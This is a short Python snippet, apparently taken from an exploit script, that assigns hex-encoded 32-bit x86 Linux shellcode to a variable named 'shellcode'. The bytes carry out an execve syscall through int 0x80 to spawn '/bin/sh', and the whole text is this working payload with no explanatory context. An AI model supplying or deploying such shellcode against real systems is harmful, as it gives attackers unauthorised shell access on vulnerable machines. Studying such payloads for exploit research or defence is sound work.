shellcode = ""
shellcode += "\xEB\x13\x5E\xB8\x0B\x00\x00\x00\x89\xF3\x6A\x00\x56\x89\xE1\x6A"
shellcode += "\x00\x89\xE2\xCD\x80\xE8\xE8\xFF\xFF\xFF"
shellcode += "/bin/sh\x00"
